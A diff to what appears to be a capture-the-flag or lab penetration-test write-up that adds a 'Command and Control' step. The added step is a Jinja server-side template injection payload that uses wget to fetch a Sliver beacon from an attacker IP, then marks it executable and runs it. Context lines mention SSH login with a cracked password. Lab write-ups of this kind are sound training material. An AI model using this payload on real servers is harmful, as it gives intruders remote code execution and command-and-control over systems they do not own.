@@ -1375,6 +1375,13 @@ drwxrwxrwt 1 root root 4096 Nov  5  2021 /tmp
 ```
 
 # Command and Control
+
+A Sliver beacon was created and hosted. The beacon was then obtained and executed by exploiting the SSTI call as follows:
+
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('wget http://10.10.14.5:8081/APPROPRIATE_CYMBAL -O bacon; chmod +x ./bacon; ./bacon &').read()}}
+```
+
 ## OG host beaconed
 Further enumeration of the host revealed there was a listening port [22] between the docker image and host. It was possible SSH in with host-mounted user directories account, 'augustus', using the previously cracked password 'superadministrator'.
 
